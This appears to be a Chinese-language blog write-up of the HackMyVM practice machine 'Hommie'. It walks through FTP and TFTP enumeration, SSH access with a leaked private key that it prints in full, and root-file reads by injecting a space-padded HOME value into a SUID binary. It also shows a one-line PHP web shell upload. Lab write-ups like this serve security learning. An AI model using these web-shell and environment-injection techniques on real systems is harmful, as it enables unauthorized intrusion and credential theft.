---
title: "Hommie"
date: 2026-03-30T14:13:30+08:00
draft: false
description: "HackMyVM 靶机 Hommie 的渗透测试与提权记录"
categories: ["靶机复盘"]
tags: ["HackMyVM", "Easy"]
---
![image-20260330141328044](image-20260330141328044.png)

## 信息收集

```shell
root@kali:/home/warn# nmap -sC -sV 192.168.174.134           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 12:58 CST
Nmap scan report for 192.168.174.134
Host is up (0.000093s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.174.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:7F:C7:9B (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```

21 端口：允许Anonymous FTP 的匿名登陆，index.html 文件是空的。

22 端口：ssh连接。

80端口：http-server：nginx 1.14.2。

```shell
root@kali:/home/warn# curl -i -s http://192.168.174.134/   
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 30 Mar 2026 05:12:33 GMT
Content-Type: text/html
Content-Length: 99
Last-Modified: Wed, 30 Sep 2020 14:43:05 GMT
Connection: keep-alive
ETag: "5f749979-63"
Accept-Ranges: bytes

alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

alexia 的 id_rsa 已经泄露，请移走它。我正在与反弹shell作斗争。

```shell
root@kali:/home/warn# ftp 192.168.174.134 21
Connected to 192.168.174.134.
220 (vsFTPd 3.0.3)
Name (192.168.174.134:warn): annoymoi^Hu
530 This FTP server is anonymous only.
ftp: Login failed
ftp> user annoymous
530 This FTP server is anonymous only.
Login failed.
ftp> user anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||31109|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Mar 28 23:33 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
ftp> cd .web
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||23424|)
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Mar 28 23:33 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 106      113            27 Mar 28 23:27 1.php # 我上传的 
-rw-r--r--    1 106      113            25 Mar 28 23:33 3.php # 
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
```

访问1.php。

```shell
warn@kali:~$ curl -i -s http://192.168.174.134/1.php
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 30 Mar 2026 05:23:36 GMT
Content-Type: application/octet-stream
Content-Length: 27
Last-Modified: Sun, 29 Mar 2026 03:27:54 GMT
Connection: keep-alive
ETag: "69c89c3a-1b"
Accept-Ranges: bytes

<?php system($_GET[1]); ?>
```

网站并没有解析php文件。反弹shell我们就不考虑了。

alexia 的 id_rsa 已经被泄露，我们现在的任务就是找到泄露的私钥。

```shell
warn@kali:~$ nmap -sU --top-ports 20 192.168.174.134
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 13:30 CST
Nmap scan report for 192.168.174.134
Host is up (0.00055s latency).
# -sU 检测UDP 协议的端口
# --top-ports  查看常见的udp端口

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
MAC Address: 00:0C:29:7F:C7:9B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
```

我们可以看到`tftp` 服务，它不确定是否开着。

```shell
warn@kali:~/Desktop$ tftp 192.168.174.134
tftp> get id_rsa
Transfer timed out.
# 我这的原因是：防火墙将这一部分数据给丢弃了。我们要添加一个规则。
# warn@kali:~$ sudo iptables -I INPUT 1 -p udp -s 192.168.174.134 -j ACCEPT
# [sudo] password for warn: 
tftp> get id_rsa
tftp>
```

## 漏洞利用

```shell
chmod 600 id_rsa
warn@kali:~/Desktop$ ssh -i ./id_rsa alexia@192.168.174.134                      
Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 29 00:56:30 2026 from 192.168.174.130
alexia@hommie:~$ ls -al
total 36
drwxr-xr-x 4 alexia alexia 4096 Sep 30  2020 .
drwxr-xr-x 3 root   root   4096 Sep 30  2020 ..
-rw-r--r-- 1 alexia alexia  220 Sep 30  2020 .bash_logout
-rw-r--r-- 1 alexia alexia 3526 Sep 30  2020 .bashrc
drwxr-xr-x 3 alexia alexia 4096 Sep 30  2020 .local
-rw-r--r-- 1 alexia alexia  807 Sep 30  2020 .profile
drwx------ 2 alexia alexia 4096 Mar 29 01:00 .ssh
-rw-r--r-- 1 alexia alexia   10 Sep 30  2020 user.txt
-rw------- 1 alexia alexia   52 Sep 30  2020 .Xauthority
alexia@hommie:~$ cat user.txt
Imnotroot
```

## 提权

```shell
alexia@hommie:~$ sudo -l
-bash: sudo: command not found
alexia@hommie:~$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
-rwsr-sr-x 1 root root 16720 Sep 30  2020 /opt/showMetheKey
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
alexia@hommie:~$ file /opt/showMetheKey
/opt/showMetheKey: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=63398a6916b1b6bf3991e2b05fa60bec15b1faff, not stripped
# 64 位 的可执行文件
alexia@hommie:~$ /opt/showMetheKey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT
gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk
WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz
bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6
0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z
HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY
OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08
QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
alexia@hommie:~$ strings /opt/showMetheKey
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
cat $HOME/.ssh/id_rsa  # 这属于环境变量注入
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
showMetheKey.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
alexia@hommie:~$ export HOME="/root/* " 
alexia@hommie:/home/alexia$ /opt/showMetheKey
I dont remember where I stored root.txt !!!
cat: /.ssh/id_rsa: No such file or directory
# 空格在这里表示分隔符
# 它告诉我们，自己并不知道 root.txt 存放在哪里。
alexia@hommie:/home/alexia$ find / -name root.txt 2>/dev/null
/usr/include/root.txt
alexia@hommie:/home/alexia$ export HOME="/usr/include/root.txt "
alexia@hommie:/home/alexia$ /opt/showMetheKey
Imnotbatman
cat: /.ssh/id_rsa: No such file or directory
```

## 总结

这道题的具体思路就是：泄露id_rsa，通过id_rsa私钥实现公私钥登陆。漏洞点在于：在`tftp` 暴露了私钥，tcp的21端口是用来迷惑人的，我们上传上去的文件并没有被php解析。

不足：我并不了解udp的`tftp`服务。

## tftp

全称 Trivial File Transfer Protocol。它比 FTP 简单得多。

特点也很明显：

- 基于 UDP
- 默认入口端口是 69
- 没有标准认证机制
- 功能很少，主要就是“上传/下载文件”
- 标准协议通常不支持 ls、cd、pwd 这种目录浏览

**TFTP 怎么工作**

- 客户端先向 69/udp 发一个“读文件”或“写文件”请求
- 如果服务端接受，它后续往往会从另一个临时 UDP 端口和你继续传输
- 所以 69 更像“敲门口”，不一定是整个传输都在 69 上完成

**在 Kali 上怎么连接**

```shell
tftp 192.168.174.134
connect 192.168.174.134 69
status # 查看当前状态
verbose # 打开详细输出
trace # 看更细的收发过程
binary # 二进制模式传输
ascii # 文本模式传输
get <remote-file> # 下载文件
put <local-file> # 上传文件
quit # 退出
```
